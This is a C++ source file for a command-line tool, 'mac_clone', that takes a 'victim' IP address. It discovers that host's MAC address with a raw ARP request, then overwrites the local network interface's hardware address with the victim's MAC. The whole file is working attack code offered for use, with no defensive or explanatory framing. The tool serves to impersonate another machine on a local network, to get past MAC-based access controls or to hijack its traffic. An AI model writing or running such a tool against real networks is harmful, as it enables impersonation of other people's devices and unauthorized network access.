// Compile: g++ -o mac_clone mac_clone.cpp
// Run: sudo ./mac_clone <interface> <victim_ip>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <linux/if_arp.h>
#include <arpa/inet.h>

class MACClone {
private:
    int sock;
    std::string iface, victimIP;
    
    void macToStr(const uint8_t* mac, char* out) {
        snprintf(out, 18, "%02x:%02x:%02x:%02x:%02x:%02x",
                 mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    }
    
public:
    MACClone(const std::string& i, const std::string& vip)
        : iface(i), victimIP(vip) {
        sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) { perror("socket"); exit(1); }
    }
    
    // Discover victim's MAC via ARP
    bool discoverVictimMAC(uint8_t* macOut) {
        int arpSock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        if (arpSock < 0) return false;
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_protocol = htons(ETH_P_ARP);
        bind(arpSock, (struct sockaddr*)&sll, sizeof(sll));
        
        // Get our own MAC
        struct ifreq ifr;
        memset(&ifr, 0, sizeof(ifr));
        strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ - 1);
        ioctl(arpSock, SIOCGIFHWADDR, &ifr);
        
        // Build ARP request
        uint8_t packet[42];
        memset(packet, 0, sizeof(packet));
        struct ether_header* eth = (struct ether_header*)packet;
        struct ether_arp* arp = (struct ether_arp*)(packet + 14);
        
        memset(eth->ether_dhost, 0xFF, 6);
        memcpy(eth->ether_shost, ifr.ifr_hwaddr.sa_data, 6);
        eth->ether_type = htons(ETH_P_ARP);
        
        arp->arp_hrd = htons(ARPHRD_ETHER);
        arp->arp_pro = htons(ETH_P_IP);
        arp->arp_hln = 6;
        arp->arp_pln = 4;
        arp->arp_op = htons(ARPOP_REQUEST);
        memcpy(arp->arp_sha, ifr.ifr_hwaddr.sa_data, 6);
        inet_pton(AF_INET, "0.0.0.0", arp->arp_spa);
        memset(arp->arp_tha, 0, 6);
        inet_pton(AF_INET, victimIP.c_str(), arp->arp_tpa);
        
        struct sockaddr_ll dest;
        memset(&dest, 0, sizeof(dest));
        dest.sll_family = AF_PACKET;
        dest.sll_ifindex = if_nametoindex(iface.c_str());
        dest.sll_halen = 6;
        memset(dest.sll_addr, 0xFF, 6);
        
        sendto(arpSock, packet, 42, 0, (struct sockaddr*)&dest, sizeof(dest));
        
        // Wait for reply
        struct timeval tv;
        tv.tv_sec = 2;
        tv.tv_usec = 0;
        setsockopt(arpSock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        
        uint8_t buffer[1024];
        for (int tries = 0; tries < 5; tries++) {
            int bytes = recv(arpSock, buffer, sizeof(buffer), 0);
            if (bytes < 42) continue;
            
            struct ether_header* reth = (struct ether_header*)buffer;
            if (ntohs(reth->ether_type) != ETH_P_ARP) continue;
            
            struct ether_arp* rarp = (struct ether_arp*)(buffer + 14);
            if (ntohs(rarp->arp_op) != ARPOP_REPLY) continue;
            
            struct in_addr replyIP;
            memcpy(&replyIP.s_addr, rarp->arp_spa, 4);
            if (strcmp(inet_ntoa(replyIP), victimIP.c_str()) == 0) {
                memcpy(macOut, rarp->arp_sha, 6);
                close(arpSock);
                return true;
            }
        }
        
        close(arpSock);
        return false;
    }
    
    bool cloneMAC() {
        uint8_t victimMAC[6];
        if (!discoverVictimMAC(victimMAC)) {
            std::cerr << "[!] Could not discover victim MAC\n";
            return false;
        }
        
        char macStr[18];
        macToStr(victimMAC, macStr);
        std::cout << "[*] Victim MAC: " << macStr << "\n";
        
        struct ifreq ifr;
        memset(&ifr, 0, sizeof(ifr));
        strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ - 1);
        ifr.ifr_hwaddr.sa_family = ARPHRD_ETHER;
        memcpy(ifr.ifr_hwaddr.sa_data, victimMAC, 6);
        
        if (ioctl(sock, SIOCSIFHWADDR, &ifr) < 0) {
            perror("[!] MAC clone failed");
            return false;
        }
        
        std::cout << "[+] Cloned victim MAC: " << macStr << "\n";
        return true;
    }
    
    ~MACClone() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <interface> <victim_ip>\n";
        return 1;
    }
    MACClone clone(argv[1], argv[2]);
    return clone.cloneMAC() ? 0 : 1;
}
